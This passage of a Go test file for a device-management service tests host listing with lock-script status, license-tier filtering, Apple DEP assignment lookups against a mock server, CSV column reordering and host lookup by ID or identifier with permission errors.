		userContext := test.UserContext(ctx, test.UserAdmin)
		hosts, err := svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)
		require.Len(t, hosts, 4)

		// Host 2 should show locked (via script)
		require.NotNil(t, hosts[1].MDM)
		require.Equal(t, string(automdm.DeviceStatusLocked), *hosts[1].MDM.DeviceStatus)
		require.Equal(t, string(automdm.PendingActionNone), *hosts[1].MDM.PendingAction)

		// Test with failed script
		ds.GetHostsLockWipeStatusBatchFunc = func(ctx context.Context, hosts []*automdm.Host) (map[uint]*automdm.HostLockWipeStatus, error) {
			statusMap := make(map[uint]*automdm.HostLockWipeStatus)

			statusMap[2] = &automdm.HostLockWipeStatus{
				HostAutoMDMPlatform: "windows",
				LockScript: &automdm.HostScriptResult{
					ExecutionID: "script-exec-2",
					ExitCode:    &exitCode1, // Failed
				},
			}

			return statusMap, nil
		}

		hosts, err = svc.ListHosts(userContext, automdm.HostListOptions{IncludeDeviceStatus: true})
		require.NoError(t, err)

		// Failed script should show unlocked
		require.NotNil(t, hosts[1].MDM)
		require.Equal(t, string(automdm.DeviceStatusUnlocked), *hosts[1].MDM.DeviceStatus)
	})
}

func TestListHostsIgnoresPremiumOptions(t *testing.T) {
	ds := new(mock.Store)
	svc, ctx := newTestService(t, ds, nil, nil)

	// filtersActive returns true when any premium filter is set. Host 1 only
	// appears when no filters are active; host 2 always appears.
	filtersActive := func(opt automdm.HostListOptions) bool {
		return opt.LowDiskSpaceFilter != nil ||
			opt.MDMBootstrapPackageFilter != nil ||
			opt.DEPProfileErrorFilter != nil ||
			opt.DEPAssignProfileResponseFilter != nil
	}

	ds.ListHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) ([]*automdm.Host, error) {
		var hosts []*automdm.Host
		if !filtersActive(opt) {
			hosts = append(hosts, &automdm.Host{ID: 1})
		}
		hosts = append(hosts, &automdm.Host{ID: 2})
		return hosts, nil
	}
	ds.CountHostsFunc = func(ctx context.Context, filter automdm.TeamFilter, opt automdm.HostListOptions) (int, error) {
		if filtersActive(opt) {
			return 1, nil
		}
		return 2, nil
	}

	cases := []struct {
		name string
		opts automdm.HostListOptions
	}{
		{"LowDiskSpaceFilter", automdm.HostListOptions{LowDiskSpaceFilter: new(32)}},
		{"MDMBootstrapPackageFilter", automdm.HostListOptions{MDMBootstrapPackageFilter: new(automdm.MDMBootstrapPackageFailed)}},
		{"DEPProfileErrorFilter", automdm.HostListOptions{DEPProfileErrorFilter: new(true)}},
		{"DEPAssignProfileResponseFilter", automdm.HostListOptions{DEPAssignProfileResponseFilter: new(automdm.DEPAssignProfileResponseFailed)}},
	}

	freeCtx := license.NewContext(test.UserContext(ctx, test.UserAdmin), &automdm.LicenseInfo{Tier: automdm.TierFree})
	premiumCtx := license.NewContext(test.UserContext(ctx, test.UserAdmin), &automdm.LicenseInfo{Tier: automdm.TierPremium})

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			// Free tier: filter is silently ignored
			hosts, err := svc.ListHosts(freeCtx, tc.opts)
			require.NoError(t, err)
			require.Len(t, hosts, 2)

			count, err := svc.CountHosts(freeCtx, nil, tc.opts)
			require.NoError(t, err)
			require.Equal(t, 2, count)

			// Premium tier: filter is used and hosts are filtered
			hosts, err = svc.ListHosts(premiumCtx, tc.opts)
			require.NoError(t, err)
			require.Len(t, hosts, 1)
			require.Equal(t, uint(2), hosts[0].ID)

			count, err = svc.CountHosts(premiumCtx, nil, tc.opts)
			require.NoError(t, err)
			require.Equal(t, 1, count)
		})
	}
}

func TestGetHostDEPAssignmentDetailsNotFoundClassification(t *testing.T) {
	ds := new(mock.Store)

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/session":
			_, err := w.Write([]byte(`{"auth_session_token": "yoo"}`))
			assert.NoError(t, err)
		case "/devices":
			var req struct {
				Devices []string `json:"devices"`
			}
			assert.NoError(t, json.NewDecoder(r.Body).Decode(&req))
			serial := req.Devices[0]

			devices := map[string]any{}
			switch serial {
			case "FOUND123":
				devices[serial] = map[string]any{
					"serial_number":   serial,
					"response_status": "SUCCESS",
					"profile_status":  "assigned",
				}
			case "EMPTYSTATUS123":
				// Status-only entry: no serial_number, no response_status.
				devices[serial] = map[string]any{}
			case "NOTACCESSIBLEWITHSERIAL123":
				// Recognized by Apple but not accessible from this MDM
				// server -- serial_number populated despite the failure.
				devices[serial] = map[string]any{
					"serial_number":   serial,
					"response_status": "NOT_ACCESSIBLE",
				}
			case "FAILEDWITHSERIAL123":
				devices[serial] = map[string]any{
					"serial_number":   serial,
					"response_status": "FAILED",
				}
				// MISSING123 is intentionally left out of the response entirely.
			}
			assert.NoError(t, json.NewEncoder(w).Encode(map[string]any{"devices": devices}))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer ts.Close()

	depStorage := &nanodep_mock.Storage{}
	depStorage.RetrieveAuthTokensFunc = func(ctx context.Context, name string) (*nanodep_client.OAuth1Tokens, error) {
		return &nanodep_client.OAuth1Tokens{}, nil
	}
	depStorage.RetrieveConfigFunc = func(context.Context, string) (*nanodep_client.Config, error) {
		return &nanodep_client.Config{BaseURL: ts.URL}, nil
	}

	svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{DEPStorage: depStorage})
	ctx = test.UserContext(ctx, test.UserAdmin)

	serialsByHostID := map[uint]string{
		1: "FOUND123",
		2: "EMPTYSTATUS123",
		3: "NOTACCESSIBLEWITHSERIAL123",
		4: "FAILEDWITHSERIAL123",
		5: "MISSING123",
	}
	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return &automdm.Host{ID: id, HardwareSerial: serialsByHostID[id]}, nil
	}
	abmTokenID := uint(9)
	ds.GetHostDEPAssignmentFunc = func(ctx context.Context, hostID uint) (*automdm.HostDEPAssignment, error) {
		return &automdm.HostDEPAssignment{HostID: hostID, ABMTokenID: &abmTokenID}, nil
	}
	ds.GetABMTokenByIDFunc = func(ctx context.Context, tokenID uint) (*automdm.ABMToken, error) {
		return &automdm.ABMToken{ID: tokenID, OrganizationName: "org"}, nil
	}
	// The DEP client's after-hook runs on every request (success or
	// failure) to keep the ABM token's token_invalid/terms_expired flags
	// in sync, so these datastore methods must be mocked too.
	ds.SetABMTokenInvalidForOrgNameFunc = func(ctx context.Context, orgName string, invalid bool) (bool, error) {
		return false, nil
	}
	ds.IsABMTokenInvalidForOrgNameFunc = func(ctx context.Context, orgName string) (bool, error) {
		return false, nil
	}
	ds.CountABMTokensWithTermsExpiredFunc = func(ctx context.Context) (int, error) {
		return 0, nil
	}
	ds.AppConfigFunc = func(ctx context.Context) (*automdm.AppConfig, error) {
		return &automdm.AppConfig{}, nil
	}

	cases := []struct {
		name       string
		hostID     uint
		wantDevice bool
		wantDepErr automdm.DEPDeviceErrorType
	}{
		{"found device is not misclassified as not found", 1, true, ""},
		{"status-only entry with empty serial is classified as not found", 2, false, automdm.DEPDeviceErrorNotFound},
		{"not-accessible device with a populated serial is still classified as not found", 3, false, automdm.DEPDeviceErrorNotFound},
		{"failed device with a populated serial is still classified as not found", 4, false, automdm.DEPDeviceErrorNotFound},
		{"missing device entry is classified as not found", 5, false, automdm.DEPDeviceErrorNotFound},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, depDevice, depErr, err := svc.GetHostDEPAssignmentDetails(ctx, c.hostID)
			require.NoError(t, err)
			assert.Equal(t, c.wantDepErr, depErr)
			if c.wantDevice {
				require.NotNil(t, depDevice)
			} else {
				assert.Nil(t, depDevice)
			}
		})
	}
}

func TestGetHostDEPAssignmentDetailsDeletedABMToken(t *testing.T) {
	ds := new(mock.Store)
	ds.HostLiteFunc = func(ctx context.Context, id uint) (*automdm.Host, error) {
		return &automdm.Host{ID: id, HardwareSerial: "SERIAL123"}, nil
	}
	// Deleting an AB token nulls abm_token_id on its hosts' assignments.
	ds.GetHostDEPAssignmentFunc = func(ctx context.Context, hostID uint) (*automdm.HostDEPAssignment, error) {
		return &automdm.HostDEPAssignment{HostID: hostID, ABMTokenID: nil}, nil
	}

	svc, ctx := newTestService(t, ds, nil, nil, &TestServerOpts{})
	ctx = test.UserContext(ctx, test.UserAdmin)

	depAssignment, depDevice, depErr, err := svc.GetHostDEPAssignmentDetails(ctx, 1)
	require.NoError(t, err)
	assert.Nil(t, depAssignment)
	assert.Nil(t, depDevice)
	assert.Empty(t, depErr)
	assert.False(t, ds.GetABMTokenByIDFuncInvoked)
}

func TestReorderCSVColumnAfter(t *testing.T) {
	cases := []struct {
		name     string
		recs     [][]string
		col      string
		afterCol string
		want     [][]string
	}{
		{
			name: "moves a column that comes after its target",
			recs: [][]string{
				{"a", "model", "b", "c", "marketing"},
				{"1", "m1", "2", "3", "mk1"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"a", "model", "marketing", "b", "c"},
				{"1", "m1", "mk1", "2", "3"},
			},
		},
		{
			name: "reorders every data row",
			recs: [][]string{
				{"a", "model", "b", "marketing"},
				{"1", "m1", "2", "mk1"},
				{"3", "m2", "4", "mk2"},
				{"5", "m3", "6", "mk3"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"a", "model", "marketing", "b"},
				{"1", "m1", "mk1", "2"},
				{"3", "m2", "mk2", "4"},
				{"5", "m3", "mk3", "6"},
			},
		},
		{
			name: "moves a column that comes before its target",
			recs: [][]string{
				{"marketing", "a", "model", "b"},
				{"mk1", "1", "m1", "2"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"a", "model", "marketing", "b"},
				{"1", "m1", "mk1", "2"},
			},
		},
		{
			name: "already immediately after target is unchanged",
			recs: [][]string{
				{"model", "marketing", "b"},
				{"m1", "mk1", "2"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"model", "marketing", "b"},
				{"m1", "mk1", "2"},
			},
		},
		{
			name: "header-only records are reordered",
			recs: [][]string{
				{"a", "marketing", "model", "b"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"a", "model", "marketing", "b"},
			},
		},
		{
			name: "missing col is a no-op",
			recs: [][]string{
				{"model", "b"},
				{"m1", "2"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"model", "b"},
				{"m1", "2"},
			},
		},
		{
			name: "missing afterCol is a no-op",
			recs: [][]string{
				{"marketing", "b"},
				{"mk1", "2"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"marketing", "b"},
				{"mk1", "2"},
			},
		},
		{
			name:     "empty records is a no-op",
			recs:     [][]string{},
			col:      "marketing",
			afterCol: "model",
			want:     [][]string{},
		},
		{
			name: "ragged rows are padded without panicking",
			recs: [][]string{
				{"a", "model", "b", "marketing"},
				{"1", "m1"},
			},
			col:      "marketing",
			afterCol: "model",
			want: [][]string{
				{"a", "model", "marketing", "b"},
				{"1", "m1", "", ""},
			},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			reorderCSVColumnAfter(c.recs, c.col, c.afterCol)
			require.Equal(t, c.want, c.recs)
		})
	}
}

// selfSignedCertForKey issues a certificate for key with the given serial, so two certificates can share one key.
func selfSignedCertForKey(t *testing.T, key *rsa.PrivateKey, serial int64) *x509.Certificate {
	t.Helper()
	cert, err := tokenpki.SelfSignedCertForKey(key, "AutoMDM WSTEP test", serial)
	require.NoError(t, err)
	return cert
}

func TestHostByIDOrIdentifier(t *testing.T) {
	const otherHostID = 42
	notFound := newNotFoundError()
	forbidden := authz.ForbiddenWithInternal("can't list hosts", nil, nil, nil)
	dbErr := errors.New("database down")
	testCases := []struct {
		name       string
		identifier string
		// failFor is the host ID that get fails for, with failErr or not found, and lookup is what HostIDByIDOrIdentifier returns.
		failFor     uint
		failErr     error
		lookupID    uint
		lookupErr   error
		wantCalls   []uint
		wantHostID  uint
		wantErr     error
		wantLookups int
	}{
		{name: "a host ID isn't looked up", identifier: "7", wantCalls: []uint{7}, wantHostID: 7},
		{name: "an identifier is looked up", identifier: "serial", lookupID: 7, wantCalls: []uint{7}, wantHostID: 7, wantLookups: 1},
		{name: "a number that isn't a host ID names another host", identifier: "7", failFor: 7, lookupID: otherHostID,
			wantCalls: []uint{7, otherHostID}, wantHostID: otherHostID, wantLookups: 1},
		// Like a recovery lock password the host doesn't have: the lookup finds the same host, so the error stands.
		{name: "not found for an existing host", identifier: "7", failFor: 7, lookupID: 7, wantCalls: []uint{7}, wantHostID: 7,
			wantErr: notFound, wantLookups: 1},
		{name: "no host has the number", identifier: "7", failFor: 7, lookupErr: notFound, wantCalls: []uint{7}, wantHostID: 7,
			wantErr: notFound, wantLookups: 1},
		{name: "a caller who can't list hosts gets the error", identifier: "7", failFor: 7, lookupErr: forbidden, wantCalls: []uint{7},
			wantHostID: 7, wantErr: notFound, wantLookups: 1},
		{name: "an identifier a caller can't look up", identifier: "serial", lookupErr: forbidden, wantErr: forbidden, wantLookups: 1},
		// Like script details, which are forbidden for a missing host so they don't reveal which IDs exist.
		{name: "forbidden for a number that isn't a host ID", identifier: "7", failFor: 7, failErr: forbidden, lookupID: otherHostID,
			wantCalls: []uint{7, otherHostID}, wantHostID: otherHostID, wantLookups: 1},
		{name: "forbidden for an existing host", identifier: "7", failFor: 7, failErr: forbidden, lookupID: 7, wantCalls: []uint{7},
			wantHostID: 7, wantErr: forbidden, wantLookups: 1},
		{name: "a number beyond a host ID's range is looked up", identifier: "4294967296", lookupID: otherHostID,
			wantCalls: []uint{otherHostID}, wantHostID: otherHostID, wantLookups: 1},
		{name: "another error for a host ID isn't looked up", identifier: "7", failFor: 7, failErr: dbErr, lookupID: otherHostID,
			wantCalls: []uint{7}, wantHostID: 7, wantErr: dbErr},
		{name: "a lookup error is returned", identifier: "7", failFor: 7, lookupErr: dbErr, wantCalls: []uint{7}, wantHostID: 7,
			wantErr: dbErr, wantLookups: 1},
	}
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			svc := &svcmock.Service{}
			lookups := 0
			svc.HostIDByIDOrIdentifierFunc = func(context.Context, string) (uint, error) {
				lookups++
				return tc.lookupID, tc.lookupErr
			}
			var calls []uint
			res, hostID, err := hostByIDOrIdentifier(t.Context(), svc, tc.identifier, func(hostID uint) (uint, error) {
				calls = append(calls, hostID)
				if hostID == tc.failFor {
					return 0, cmp.Or(tc.failErr, error(notFound))
				}
				return hostID, nil
			})
			require.ErrorIs(t, err, tc.wantErr)
			require.Equal(t, tc.wantCalls, calls)
			require.Equal(t, tc.wantHostID, hostID)
			require.Equal(t, tc.wantLookups, lookups)
			if tc.wantErr == nil {
				require.Equal(t, tc.wantHostID, res)
			}
		})
	}
}
